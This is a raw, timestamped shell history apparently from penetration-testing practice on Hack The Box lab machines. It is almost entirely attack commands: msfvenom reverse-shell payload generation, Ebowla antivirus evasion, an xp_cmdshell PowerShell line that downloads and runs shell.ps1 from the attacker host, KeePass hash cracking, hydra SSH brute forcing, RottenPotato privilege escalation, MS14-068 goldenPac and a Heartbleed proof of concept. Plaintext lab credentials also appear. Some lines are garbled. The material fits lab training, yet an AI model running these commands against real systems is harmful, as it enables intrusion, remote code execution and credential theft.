 5853  2020-11-11 09:59  dnsreconsup3rs3cr3t.brainfuck.htb\n
 5854  2020-11-11 09:59  dnsrecon sup3rs3cr3t.brainfuck.htb\n
 5855  2020-11-11 10:00  dnsrecon -d sup3rs3cr3t.brainfuck.htb\n
 5856  2020-11-11 10:00  dnsrecon -d www.brainfuck.htb\n
 5857  2020-11-11 10:01  orestis@brainfuck.htb
 5858  2020-11-11 10:05  vim /etc/hsots
 5859  2020-11-11 10:06  soruce /etc/hosts
 5860  2020-11-11 22:00  export /etc/hosts
 5861  2020-11-11 22:00  source /etc/hosts
 5862  2020-11-11 22:01  ./create_direcotry.sh  10.10.10.59
 5863  2020-11-11 22:02  10.10.10.59
 5864  2020-11-12 06:56  strings NDP452-KB2901907-x86-x64-AllOS-ENU.exe
 5865  2020-11-12 06:56  strings Sage50_2017.2.0.exe
 5866  2020-11-12 06:57  wine tester.exe
 5867  2020-11-12 06:59  searchsploit  Directory Traversal u
 5868  2020-11-12 11:28  tar -C /usr/local -xzf go1.15.4.linux-amd64.tar.gz
 5869  2020-11-12 11:28  sudo tar -C /usr/local -xzf go1.15.4.linux-amd64.tar.gz
 5870  2020-11-12 11:28  export PATH=$PATH:/usr/local/go/bin
 5871  2020-11-12 07:04  las
 5872  2020-11-12 07:06  sudo kill -9 648
 5873  2020-11-12 07:08  cherrytree ../report/.31ctb.ctb
 5874  2020-11-12 07:12  cp shell.ps1 ~/HTB/results/10.10.10.59/exploit
 5875  2020-11-12 07:12  cd ~/HTB/results/10.10.10.59/exploit
 5876  2020-11-12 09:57  cd wom
 5877  2020-11-12 11:05  cd resd
 5878  2020-11-12 11:05  locate potato
 5879  2020-11-12 11:06  cd /usr/share/metasploit-framework/data/exploits/juicypotato
 5880  2020-11-12 11:06  /usr/share/metasploit-framework/data/exploits/juicypotato
 5881  2020-11-12 11:07  locate Juicypotato\n
 5882  2020-11-12 11:07  locate juicypotato\n
 5883  2020-11-12 11:07  locate / | grep juicypotato\n
 5884  2020-11-12 11:08  cd 2
 5885  2020-11-12 11:15  git clone JuicyPotato.exe
 5886  2020-11-12 11:15  git clone https://github.com/Genetic-Malware/Ebowla.git
 5887  2020-11-12 11:20  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=443 -f exe > shell.exe
 5888  2020-11-12 11:22  cat documentation.md
 5889  2020-11-12 11:23  sudo apt install configobj
 5890  2020-11-12 11:24  pip install --user configobj
 5891  2020-11-12 11:24  python ebowla.py shell.exe genetic.config
 5892  2020-11-12 11:27  sudo apt install go
 5893  2020-11-12 11:27  go version
 5894  2020-11-12 11:29  ./build_x64_go.sh output/go_symmetric_shell.exe.go port443.exe
 5895  2020-11-12 19:31  sudo apt update && sudo apt install golang\n
 5896  2020-11-12 19:33  ./build_x64_go.sh output/go_symmetric_shell.exe.go shell.exe
 5897  2020-11-12 19:36  cherrytree ~/OSCP/results/10.11.1.31
 5898  2020-11-12 20:16  sudo y install veil
 5899  2020-11-12 20:16  sudo apt -y install veil
 5900  2020-11-12 20:27  pip --version
 5901  2020-11-12 20:27  pip3 --version
 5902  2020-11-12 20:28  sudo apt uninstall veil
 5903  2020-11-12 20:28  sudo apt remove veil
 5904  2020-11-12 20:28  wine
 5905  2020-11-12 20:28  wine shell.exe
 5906  2020-11-12 20:29  go
 5907  2020-11-12 20:29  go --version
 5908  2020-11-12 20:29  go --v
 5909  2020-11-12 20:31  ruby 
 5910  2020-11-12 20:31  ruby  --versin
 5911  2020-11-12 20:31  sudo apt update
 5912  2020-11-12 20:31  sudo apt upgrade
 5913  2020-11-12 20:34  reboot
 5914  2020-11-11 22:08  nmap -sCV -oA top1000 10.10.10.59
 5915  2020-11-11 22:19  smbclient -L \\10.10.10.59
 5916  2020-11-11 22:19  smbclient  \\10.10.10.59
 5917  2020-11-11 22:20  cat ~/OSCP/13/results/10.11.1.13/scans/_manual_commands.txt 
 5918  2020-11-11 22:21  cat ~/OSCP/13/results/10.11.1.13/scans/_commands.log
 5919  2020-11-11 22:24  smbmap -H 10.10.10.59 -P 445
 5920  2020-11-11 22:25  smbmap -H 10.10.10.59 -P 139
 5921  2020-11-11 22:25  gobuster dir -u http://10.10.10.59/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o gobuster.txt
 5922  2020-11-11 22:33  cat /usr/share/wordlists/fasttrack.txt
 5923  2020-11-11 22:51  cat /usr/share/wordlists/wfuzz/vulns/sharepoint.txt
 5924  2020-11-11 22:52  gobuster dir -u http://10.10.10.59/ -w /usr/share/wordlists/wfuzz/vulns/sharepoint.txt -e -k -l -s "200,204,301,302,307,403,500"   -o gobuster.txt
 5925  2020-11-12 01:03  smbclient -L\\ -N -I 10.10.10.59
 5926  2020-11-12 01:04  smbclient \\10.10.10.59/htb.local
 5927  2020-11-12 01:04  smbclient \\10.10.10.59/ -w htb.local
 5928  2020-11-12 01:04  smbclient \\10.10.10.59/ -W htb.local
 5929  2020-11-12 01:04  smbclient \\10.10.10.59/ 
 5930  2020-11-12 01:05  smbclient -L\\  -I 10.10.10.59
 5931  2020-11-12 01:31  cls
 5932  2020-11-12 01:42  wget --mirrior
 5933  2020-11-12 01:43  wget --mirror 'ftp://ftp_user:'
 5934  2020-11-12 01:44  wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'
 5935  2020-11-12 01:46  tail RED-5289349.log
 5936  2020-11-12 01:46  vim RED-5289349.log
 5937  2020-11-12 01:47  cd ~/HTB/results/10.10.10.59/loot/10.10.10.59/Intranet/Binaries
 5938  2020-11-12 01:59  unzip Invoices.zip
 5939  2020-11-12 01:59  cat invoice_2017_id_5368
 5940  2020-11-12 01:59  ]ls
 5941  2020-11-12 02:00  cd users
 5942  2020-11-12 02:00  cd Administrator
 5943  2020-11-12 02:00  cat l
 5944  2020-11-12 02:00  cat l.l
 5945  2020-11-12 02:01  cat .listing
 5946  2020-11-12 02:02  open
 5947  2020-11-12 02:03  xdg-open  actu8-espreadsheet-designer-datasheet.pdf
 5948  2020-11-12 02:05  cd ekta
 5949  2020-11-12 02:05  cd Ekta
 5950  2020-11-12 02:05  cd jess
 5951  2020-11-12 02:05  cd Jess
 5952  2020-11-12 02:05  cd Paul
 5953  2020-11-12 02:06  cd Rahul
 5954  2020-11-12 02:06  cd Mockups-Backup
 5955  2020-11-12 02:06  cd Sarah
 5956  2020-11-12 02:06  cat notes.txt
 5957  2020-11-12 02:06  cd Stuart
 5958  2020-11-12 02:07  xdg-open  Unit4-Connect-Financials-Agenda.pdf
 5959  2020-11-12 02:07  cat bonus.txt
 5960  2020-11-12 02:08  strings tim.kdbx
 5961  2020-11-12 02:10  cd Yenwi
 5962  2020-11-12 02:10  cd Archive
 5963  2020-11-12 02:10  cd /..
 5964  2020-11-12 02:10  cd ~/HTB/results/10.10.10.59/loot/10.10.10.59/User/Yenwi/Archive
 5965  2020-11-12 02:19  cd Intranet
 5966  2020-11-12 02:19  cd To-Upload
 5967  2020-11-12 02:19  cd Invoices
 5968  2020-11-12 02:19  cd logs
 5969  2020-11-12 02:19  cd Logs
 5970  2020-11-12 02:19  cat ftp_connect_8235771490530.txt
 5971  2020-11-12 02:20  cd From-Custodian
 5972  2020-11-12 02:20  cat RED-528103410.log
 5973  2020-11-12 02:20  cat RED-5282342.log
 5974  2020-11-12 02:52  cd User
 5975  2020-11-12 02:52  cd KeePass-2.36
 5976  2020-11-12 05:25  cd Plugins
 5977  2020-11-12 05:25  cd ../
 5978  2020-11-12 05:25  cd XSL
 5979  2020-11-12 05:25  cat tim.kdbx
 5980  2020-11-12 05:25  keepass2john tim.kdbx
 5981  2020-11-12 05:26  touch timkeypass.txt
 5982  2020-11-12 05:26  vim timkeypass.txt
 5983  2020-11-12 05:26  john  -w=/usr/share/wordlists/rockyou.txt timkeypass.txt
 5984  2020-11-12 05:29  vi timkeypass.txt
 5985  2020-11-12 05:30  cd User/
 5986  2020-11-12 05:30  cd Tim
 5987  2020-11-12 05:30  cd Files
 5988  2020-11-12 05:30  keepass2john tim.kdbx > tim-keypass-hash
 5989  2020-11-12 05:31  mv tim-keypass-hash ../../../../
 5990  2020-11-12 05:31  cat tim-keypass-hash
 5991  2020-11-12 05:31  cat timkeypass.txt
 5992  2020-11-12 05:31  rm timkeypass.txt
 5993  2020-11-12 05:31  john  -w=/usr/share/wordlists/rockyou.txt tim-keypass-hash
 5994  2020-11-12 05:40  sudo apt install keepass
 5995  2020-11-12 05:40  sudo apt install keepass2
 5996  2020-11-12 05:41  keepass2
 5997  2020-11-12 05:45  smbclient  //10.10.10.59/account -U "Finance"
 5998  2020-11-12 05:45  smbclient  //10.10.10.59/ -U "Finance"
 5999  2020-11-12 06:00  #smbclient '\\10.10.10.59\ACCT' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'`\n
 6000  2020-11-12 06:01  smbclient '\\10.10.10.59\ACCT' -N -c 'prompt OFF;recurse ON;cd '\\10.10.10.59\ACCT\';lcd './';mget *'`
 6001  2020-11-12 06:02  smbclient '\\10.10.10.59\ACCT' -N -c 'prompt OFF;recurse ON;cd '\\10.10.10.59\ACCT\';lcd './';mget *'
 6002  2020-11-12 06:02  smbclient '\\10.10.10.59\ACCT' -N -c 'prompt OFF;recurse ON;cd '\\10.10.10.59\ACCT\';lcd './';mget *'`\n
 6003  2020-11-12 06:02  smbclient '\\10.10.10.59\ACCT\n
 6004  2020-11-12 06:02  smbclient \\10.10.10.59\ACCT\n
 6005  2020-11-12 06:02  smbclient  //10.10.10.59/ACCT -U "Finance"
 6006  2020-11-12 06:37  xdg-open Sage\ 50\ v1.9.3.1\ Hotfix\ 1\ Release\ Notes.pdf
 6007  2020-11-12 06:39  xdg-openxdg-open
 6008  2020-11-12 06:41  cat in
 6009  2020-11-12 06:41  cat install-notes.txt
 6010  2020-11-12 06:46  less install-notes.txt
 6011  2020-11-12 06:47  cd Tally.ERP\ 9\ Release\ 6
 6012  2020-11-12 06:47  cd capsules
 6013  2020-11-12 06:47  cd backup
 6014  2020-11-12 06:48  cd Backup
 6015  2020-11-12 06:48  cd 20170801
 6016  2020-11-12 06:48  cd Themes
 6017  2020-11-12 06:48  cd TheAdmin
 6018  2020-11-12 06:48  cat Theme.
 6019  2020-11-12 06:48  cat Theme.txt
 6020  2020-11-12 06:48  cat Web.config
 6021  2020-11-12 06:48  grep -r "password"
 6022  2020-11-12 19:34  cd zz_Migration
 6023  2020-11-12 19:34  cd Binaries
 6024  2020-11-12 19:34  cd CardReader
 6025  2020-11-12 19:34  cd Evals
 6026  2020-11-12 19:34  cd New\ folder
 6027  2020-11-12 19:35  strings tester.exe
 6028  2020-11-12 19:35  UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;\n
 6029  2020-11-13 03:33  sqsh -S 10.10.10.59 -U sa -P "GWE3V65#6KFH93@4GWTG2G"
 6030  2020-11-13 09:50  smbclient  //10.10.10.52/ -U "Finance"
 6031  2020-11-13 09:50  smbclient  //10.10.10.52/ -U ""
 6032  2020-11-13 09:51  smbclient  //10.10.10.52/NETLOGON -U james
 6033  2020-11-13 09:52  smbclient -L 10.10.10.52/ -U james
 6034  2020-11-13 09:52  smbclient  //10.10.10.52/SYSVOL -U james
 6035  2020-11-13 01:41  ping 10.10.10.59\n: 1605231712:0;ping 10.10.10.59
 6036  2020-11-13 01:43  cherrytree ~/OSCP/results/10.11.1.31/report/.31ctb.ctb
 6037  2020-11-13 01:44  sudo service apache2 stop\n
 6038  2020-11-13 01:44  kill -9 602
 6039  2020-11-13 01:45  sudo kill -9 602
 6040  2020-11-13 01:46  git clone xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.18/shell.ps1')"
 6041  2020-11-13 01:46  git clone https://github.com/breenmachine/RottenPotatoNG.git
 6042  2020-11-13 01:48  sudo hydra -l megan -P /usr/share/wordlists/rockyou.txt -e nsr -s 22 -o tcp_22_ssh_hydra.txt ssh://10.1.1.27
 6043  2020-11-13 01:54  #msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=443 -f exe -a x64 -o > shellx64args.exe
 6044  2020-11-13 01:54  ls
 6045  2020-11-13 01:54  cd ..
 6046  2020-11-13 01:54  l
 6047  2020-11-13 01:54  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=443 -f exe -a x64 -o > shellx64args.exe
 6048  2020-11-13 01:57  ls
 6049  2020-11-13 01:57  cd ..
 6050  2020-11-13 01:57  ls
 6051  2020-11-13 01:57  cd erx
 6052  2020-11-13 01:57  l
 6053  2020-11-13 01:57  cd exploit
 6054  2020-11-13 01:57  lk
 6055  2020-11-13 01:57  sls
 6056  2020-11-13 01:57  ls
 6057  2020-11-13 01:57  cd Ebowla
 6058  2020-11-13 01:59  python ebowla.py ../shellx64args.exe genetic.config
 6059  2020-11-13 02:01  ./build_x64_go.sh output/go_symmetric_shellx64args.exe.go ebowlashellx64args.exe
 6060  2020-11-13 02:01  ls
 6061  2020-11-13 02:01  cd output
 6062  2020-11-13 02:01  l
 6063  2020-11-13 02:01  sudo python -m SimpleHTTPServer 80
 6064  2020-11-13 02:06  cd ..
 6065  2020-11-13 02:06  ;s
 6066  2020-11-13 02:06  ls
 6067  2020-11-13 02:06  touch shell.bat
 6068  2020-11-13 02:06  vim shell.bat
 6069  2020-11-13 02:07  ls
 6070  2020-11-13 02:07  cd Ebowla
 6071  2020-11-13 02:07  vim genetic.config
 6072  2020-11-13 02:12  ls
 6073  2020-11-13 02:12  cd ..
 6074  2020-11-13 02:12  l;
 6075  2020-11-13 02:12  cd Ebowla
 6076  2020-11-13 02:12  l
 6077  2020-11-13 02:12  cd output
 6078  2020-11-13 02:12  l
 6079  2020-11-13 02:12  sudo python -m SimpleHTTPServer 80
 6080  2020-11-13 02:52  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.18 LPORT=443 -f exe -a x64 -o > shellx64args.exeu
 6081  2020-11-13 03:02  ftp 10.10.10.59
 6082  2020-11-13 03:02  ping 10.10.10.59
 6083  2020-11-13 03:03  ip a
 6084  2020-11-13 03:05  ping 10.10.10.59
 6085  2020-11-13 03:06  ftp 10.10.10.59
 6086  2020-11-13 03:09  ls
 6087  2020-11-13 03:09  cd ..
 6088  2020-11-13 03:09  ls
 6089  2020-11-13 03:09  cd ..
 6090  2020-11-13 03:09  cd windows_priv_esc_scripts
 6091  2020-11-13 03:09  l
 6092  2020-11-13 03:09  cd RottenPotatoNG
 6093  2020-11-13 03:09  l
 6094  2020-11-13 03:09  cd RottenPotatoEXE
 6095  2020-11-13 03:09  l;
 6096  2020-11-13 03:09  cd x64
 6097  2020-11-13 03:09  l;
 6098  2020-11-13 03:09  cd res
 6099  2020-11-13 03:09  l
 6100  2020-11-13 03:09  cd Release
 6101  2020-11-13 03:09  l
 6102  2020-11-13 03:09  sudo python -m SimpleHTTPServer 80
 6103  2020-11-13 03:09  ftp 10.10.10.59
 6104  2020-11-13 03:11  ls
 6105  2020-11-13 03:11  cd ..
 6106  2020-11-13 03:11  ls
 6107  2020-11-13 03:11  grep -r ".exe"
 6108  2020-11-13 03:12  rg .exe
 6109  2020-11-13 03:12  find ./ | grep .exe
 6110  2020-11-13 03:14  cd ./RottenPotatoEXE/x64/Release/
 6111  2020-11-13 03:14  ftp 10.10.10.59
 6112  2020-11-13 03:31  cd ..
 6113  2020-11-13 03:31  ls
 6114  2020-11-13 03:31  cd results/10.10.10.59
 6115  2020-11-13 03:31  l
 6116  2020-11-13 03:31  cd exploit
 6117  2020-11-13 03:31  l
 6118  2020-11-13 03:31  ftp 10.10.10.59
 6119  2020-11-13 03:32  ls
 6120  2020-11-13 03:32  cd Ebowla/output
 6121  2020-11-13 03:46  ftp 10.10.10.59
 6122  2020-11-13 03:50  ls
 6123  2020-11-13 03:50  ftp 10.10.10.59
 6124  2020-11-13 03:51  cd ..
 6125  2020-11-13 03:51  cd windows_priv_esc_scripts
 6126  2020-11-13 03:51  ls
 6127  2020-11-13 03:51  cd RottenPotatoNG
 6128  2020-11-13 03:51  ls
 6129  2020-11-13 03:51  cd RottenPotato
 6130  2020-11-13 03:51  cd RottenPotatoEXE
 6131  2020-11-13 03:51  ls
 6132  2020-11-13 03:51  cd x64
 6133  2020-11-13 03:51  kl
 6134  2020-11-13 03:51  k
 6135  2020-11-13 03:51  l
 6136  2020-11-13 03:51  cd Release
 6137  2020-11-13 03:51  ls
 6138  2020-11-13 03:51  ftp 10.10.10.59
 6139  2020-11-13 03:52  ls
 6140  2020-11-13 03:53  cp MSFRottenPotato.exe ../
 6141  2020-11-13 03:53  cd ..
 6142  2020-11-13 03:53  l
 6143  2020-11-13 03:53  vim .
 6144  2020-11-13 03:53  l
 6145  2020-11-13 03:53  vim .
 6146  2020-11-13 03:53  ls
 6147  2020-11-13 03:53  cd ..
 6148  2020-11-13 03:53  l
 6149  2020-11-13 03:53  cd Release
 6150  2020-11-13 03:53  ls
 6151  2020-11-13 03:53  cd ..
 6152  2020-11-13 03:53  ls
 6153  2020-11-13 03:53  cd x64
 6154  2020-11-13 03:53  ls
 6155  2020-11-13 03:54  ftp 10.10.10.59
 6156  2020-11-13 03:55  cd ..
 6157  2020-11-13 03:55  ls
 6158  2020-11-13 03:55  cd ..
 6159  2020-11-13 03:55  ls
 6160  2020-11-13 03:55  cd results
 6161  2020-11-13 03:55  ls
 6162  2020-11-13 03:55  cd 10.10.10.59
 6163  2020-11-13 03:55  ls
 6164  2020-11-13 03:55  l
 6165  2020-11-13 03:56  rm -rf Customers Fees Invoices/ Jess Payroll Reports Tax zz_Archived zz_Migration
 6166  2020-11-13 03:56  l
 6167  2020-11-13 03:56  rm -rf Transactions
 6168  2020-11-13 03:56  ls
 6169  2020-11-13 03:56  cat conn-info.txt
 6170  2020-11-13 09:02  ping 10.10.10.52
 6171  2020-11-13 09:02  cd ..
 6172  2020-11-13 09:02  ls
 6173  2020-11-13 09:02  ./create_direcotry.sh  10.10.10.52
 6174  2020-11-13 09:02  ls
 6175  2020-11-13 09:03  cd results
 6176  2020-11-13 09:03  l
 6177  2020-11-13 09:03  cd  10.10.10.52
 6178  2020-11-13 09:03  ls
 6179  2020-11-13 09:03  cd scans
 6180  2020-11-13 09:03  l
 6181  2020-11-13 09:03  nmap -sCV -oA top1000 10.10.10.52
 6182  2020-11-13 09:05  nmap -sCV -p- -oA  nmap_allports 10.10.10.52
 6183  2020-11-13 09:10  gobuster dir -u http://10.10.10.52:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o gobuster8080.txt
 6184  2020-11-13 09:22  http://10.10.10.52:1337/
 6185  2020-11-13 09:22  gobuster dir -u http://10.10.10.52:1337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o gobuster1337.txt
 6186  2020-11-13 20:31  exit
 6187  2020-11-13 20:33  cd ..
 6188  2020-11-13 20:33  cd 10.10.10.79
 6189  2020-11-13 20:33  ls
 6190  2020-11-13 20:33  cd scans
 6191  2020-11-13 20:34  gobuster dir -u http://10.10.10.79  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"  -o gobuster80.txt
 6192  2020-11-13 20:53  exit
 6193  2020-11-13 09:07  seachsploit  Orchard
 6194  2020-11-13 09:08  searchsploit  Orchard
 6195  2020-11-13 09:11  searchsploit  -x php/webapps/36493.txt
 6196  2020-11-13 09:12  searchsploit  -x asp/webapps/37533.txt
 6197  2020-11-13 09:13  searchsploit  Orchard
 6198  2020-11-13 09:13  searchsploit  -x aspx/webapps/48456.txt
 6199  2020-11-13 09:15  smbclient -L //10.10.10.52/
 6200  2020-11-13 09:15  smbmap -H 10.10.10.52 -P 139
 6201  2020-11-13 09:16  smbmap -H 10.10.10.52 -P 445
 6202  2020-11-13 09:16  ccc
 6203  2020-11-13 09:16  ls
 6204  2020-11-13 09:16  cd ~/HTB/results/10.10.10.52/scans
 6205  2020-11-13 09:16  ls
 6206  2020-11-13 09:16  cat top1000.nmap
 6207  2020-11-13 09:21  ls
 6208  2020-11-13 09:21  cat nmap_allports.gnmap
 6209  2020-11-13 09:21  cat nmap_allports.nmap
 6210  2020-11-13 09:40  sqsh -S 10.10.10.52 -U sa -P "m$$ql_S@_P@ssW0rd
 6211  2020-11-13 09:40  sqsh -S 10.10.10.52 -U sa -P "m$$ql_S@_P@ssW0rd"
 6212  2020-11-13 09:40  sqsh -S 10.10.10.52 -U admin -P "m$$ql_S@_P@ssW0rd"
 6213  2020-11-13 09:55  vim 10.10.10.52\tmantis.htb.local\tmantis\n
 6214  2020-11-13 09:56  vim /etc/hosts
 6215  2020-11-13 09:56  sudo vim /etc/hosts
 6216  2020-11-13 09:56  sudo vim /etc/krb5.conf
 6217  2020-11-13 09:56  rdate -n 10.10.10.52\n
 6218  2020-11-13 09:56  sudo apt install rdate
 6219  2020-11-13 10:03  rdate -n 10.10.10.52\n
 6220  2020-11-13 10:03  sudo rdate -n 10.10.10.52\n
 6221  2020-11-13 10:04  kinit james
 6222  2020-11-13 10:04  sudo apt  install impacket tools
 6223  2020-11-13 10:05  pip install --user impacket
 6224  2020-11-13 10:05  kinit james
 6225  2020-11-13 10:05  sudo apt install kinit
 6226  2020-11-13 10:07  kinit james
 6227  2020-11-13 10:09  sudo apt install krb5-user cifs-utils
 6228  2020-11-13 10:19  ls
 6229  2020-11-13 10:19  kinit james
 6230  2020-11-13 10:19  sudo kinit james
 6231  2020-11-13 10:19  sudo vim /etc/krb5.conf
 6232  2020-11-13 10:20  source /etc/krb5.conf
 6233  2020-11-13 10:21  vi /etc/resolv.conf
 6234  2020-11-13 10:24  sudo vi /etc/resolv.conf
 6235  2020-11-13 10:27  sudo kinit james
 6236  2020-11-13 10:27  vim /etc/krb5.conf
 6237  2020-11-13 10:33  sudo vim /etc/krb5.conf
 6238  2020-11-13 10:36  sudo rdate -n mantis.htb.local\n
 6239  2020-11-13 10:36  sudo kinit james
 6240  2020-11-13 10:37  source /etc/krb5.conf
 6241  2020-11-13 10:37  sudo kinit james
 6242  2020-11-13 10:37  export /etc/krb5.conf
 6243  2020-11-13 10:37  sudo kinit james
 6244  2020-11-13 10:38  sudo vim /etc/krb5.conf
 6245  2020-11-13 10:39  sudo kinit james
 6246  2020-11-13 10:39  sudo kinit jame
 6247  2020-11-13 10:39  sudo kinit jf
 6248  2020-11-13 10:39  sudo kinit jfsafasd
 6249  2020-11-13 10:39  sudo kinit james
 6250  2020-11-13 10:40  sudo vim /etc/krb5.conf
 6251  2020-11-13 10:41  sudo kinit james
 6252  2020-11-13 10:41  sudo vim /etc/krb5.conf
 6253  2020-11-13 10:43  sudo kinit james
 6254  2020-11-13 10:45  klist
 6255  2020-11-13 10:45  sudo klist
 6256  2020-11-13 10:46  rpcclient -U james mantis
 6257  2020-11-13 10:47  cd ..
 6258  2020-11-13 10:47  cd exploit
 6259  2020-11-13 10:47  touch windowskernelexploit.py
 6260  2020-11-13 10:47  vim windowskernelexploit.py
 6261  2020-11-13 10:47  chmod +x windowskernelexploit.py
 6262  2020-11-13 10:49  python windowskernelexploit.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis
 6263  2020-11-13 10:50  ls
 6264  2020-11-13 10:50  git clone https://github.com/mubix/pykek.git
 6265  2020-11-13 10:51  ls
 6266  2020-11-13 10:51  cd pykek
 6267  2020-11-13 10:51  ls
 6268  2020-11-13 10:51  chmod +x ms14-068.py
 6269  2020-11-13 10:51  ls
 6270  2020-11-13 10:53  python ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103  -d mantis
 6271  2020-11-13 10:54  ls
 6272  2020-11-13 10:54  cat TGT_james@HTB.LOCAL.ccache
 6273  2020-11-13 10:54  goldenPAC.py
 6274  2020-11-13 10:54  ls
 6275  2020-11-13 10:54  cd ..
 6276  2020-11-13 10:54  ls
 6277  2020-11-13 10:55  git clone https://github.com/SecureAuthCorp/impacket
 6278  2020-11-13 10:55  ls
 6279  2020-11-13 10:55  cd impacket
 6280  2020-11-13 10:55  lks
 6281  2020-11-13 10:55  ls
 6282  2020-11-13 10:55  cd impacket
 6283  2020-11-13 10:55  ls
 6284  2020-11-13 10:55  cd examples
 6285  2020-11-13 10:55  ls
 6286  2020-11-13 10:55  cd ..
 6287  2020-11-13 10:55  l;s
 6288  2020-11-13 10:56  ;s
 6289  2020-11-13 10:56  locate goldenPac.py
 6290  2020-11-13 10:56  /usr/share/doc/python3-impacket/examples/goldenPac.py
 6291  2020-11-13 10:56  ls
 6292  2020-11-13 10:56  cd pk
 6293  2020-11-13 10:56  cd pykek
 6294  2020-11-13 10:56  ;ds
 6295  2020-11-13 10:56  ls
 6296  2020-11-13 10:57  /usr/share/doc/python3-impacket/examples/goldenPac.py  HTB.LOCAL/james@mantis
 6297  2020-11-13 10:58  ls
 6298  2020-11-13 10:58  cp TGT_james@HTB.LOCAL.ccache /tmp/krb5cc_0
 6299  2020-11-13 10:58  sudo cp TGT_james@HTB.LOCAL.ccache /tmp/krb5cc_0
 6300  2020-11-13 10:58  cp TGT_james@HTB.LOCAL.ccache /tmp/krb5cc_0
 6301  2020-11-13 10:58  /usr/share/doc/python3-impacket/examples/goldenPac.py  HTB.LOCAL/james@mantis
 6302  2020-11-13 10:58  cat /tmp/krb5cc_0
 6303  2020-11-13 10:58  sudo /usr/share/doc/python3-impacket/examples/goldenPac.py  HTB.LOCAL/james@mantis
 6304  2020-11-13 11:01  cd ..
 6305  2020-11-13 11:01  l
 6306  2020-11-13 11:01  cd impacket
 6307  2020-11-13 11:01  ls
 6308  2020-11-13 11:01  sudo python setup.py
 6309  2020-11-13 11:01  sudo python setup.py install
 6310  2020-11-13 11:02  sudo /usr/share/doc/python3-impacket/examples/goldenPac.py  HTB.LOCAL/james@mantis
 6311  2020-11-13 20:27  ls
 6312  2020-11-13 20:27  cd ..
 6313  2020-11-13 20:27  ls
 6314  2020-11-13 20:27  cd pykek
 6315  2020-11-13 20:27  ls
 6316  2020-11-13 20:27  cd ..
 6317  2020-11-13 20:27  l
 6318  2020-11-13 20:27  rm windowskernelexploit.py
 6319  2020-11-13 20:27  ls
 6320  2020-11-13 20:27  cd ..
 6321  2020-11-13 20:27  ls
 6322  2020-11-13 20:27  cd scans
 6323  2020-11-13 20:27  ls
 6324  2020-11-13 20:27  cd ..
 6325  2020-11-13 20:27  ls
 6326  2020-11-13 20:27  .
 6327  2020-11-13 20:27  ls
 6328  2020-11-13 20:30  ping  10.10.10.79
 6329  2020-11-13 20:30  ls
 6330  2020-11-13 20:30  cd ..
 6331  2020-11-13 20:30  ./create_direcotry.sh  10.10.10.79
 6332  2020-11-13 20:30  ls
 6333  2020-11-13 20:30  cd results
 6334  2020-11-13 20:30  l
 6335  2020-11-13 20:30  cd  10.10.10.79
 6336  2020-11-13 20:30  ;s
 6337  2020-11-13 20:30  ls
 6338  2020-11-13 20:30  cd scans
 6339  2020-11-13 20:30  ls
 6340  2020-11-13 20:31  nmap -sCV -oA nmaptop1000ports
 6341  2020-11-13 20:31  nmap -sCV -oA nmaptop1000ports  10.10.10.79
 6342  2020-11-13 20:31  dig  10.10.10.79
 6343  2020-11-13 20:31  cur l 10.10.10.79
 6344  2020-11-13 20:31  curl  10.10.10.79
 6345  2020-11-13 20:35  nmap  -p- -oA  nmap_allports_t4 10.10.10.79 -T4
 6346  2020-11-13 20:36  ls
 6347  2020-11-13 20:36  cd ..
 6348  2020-11-13 20:36  l
 6349  2020-11-13 20:36  cd loot
 6350  2020-11-13 20:36  ls
 6351  2020-11-13 20:37  touch Valentineprivatekey
 6352  2020-11-13 20:37  vim Valentineprivatekey
 6353  2020-11-13 20:39  chmod 600 Valentineprivatekey
 6354  2020-11-13 20:39  l
 6355  2020-11-13 20:39  cat Valentineprivatekey
 6356  2020-11-13 20:40  cat ~/.ssh/id_rsa
 6357  2020-11-13 20:40  ls
 6358  2020-11-13 20:42  sslyze --regular 10.10.10.79
 6359  2020-11-13 20:46  echo "QUIT"|openssl s_client -connect https://10.10.10.79:443 2>&1|grep 'server extension "heartbeat" (id=15)' || echo safe safe
 6360  2020-11-13 20:46  echo "QUIT"|openssl s_client -connect https://10.10.10.79:443 2>&1|grep 'server extension "heartbeat" (id=15)' || echo safe 
 6361  2020-11-13 20:48  nmap --script ssl-heartbleed 10.10.10.79
 6362  2020-11-13 20:49  cd ..
 6363  2020-11-13 20:49  ls
 6364  2020-11-13 20:49  cd exploit
 6365  2020-11-13 20:49  l
 6366  2020-11-13 20:49  touch heartbleedpoc.py
 6367  2020-11-13 20:49  vim heartbleedpoc.py
 6368  2020-11-13 20:49  chmod +x heartbleedpoc.py
 6369  2020-11-13 20:49  python heartbleedpoc.py
 6370  2020-11-13 20:50  python heartbleedpoc.py 10.10.10.79
 6371  2020-11-13 20:57  ls
 6372  2020-11-13 20:57  cd ..
 6373  2020-11-13 20:57  ls
 6374  2020-11-13 20:57  cd loot
 6375  2020-11-13 20:57  ls
 6376  2020-11-13 20:57  ssh -i Valentineprivatekey 10.10.10.79
 6377  2020-11-13 20:59  vim .
 6378  2020-11-13 20:59  l
 6379  2020-11-13 20:59  ssh -i hype_key 10.10.10.79
 6380  2020-11-13 21:03  ssh -i hype_key hype@10.10.10.79
 6381  2020-11-13 22:20  ls
 6382  2020-11-13 22:20  cd ..
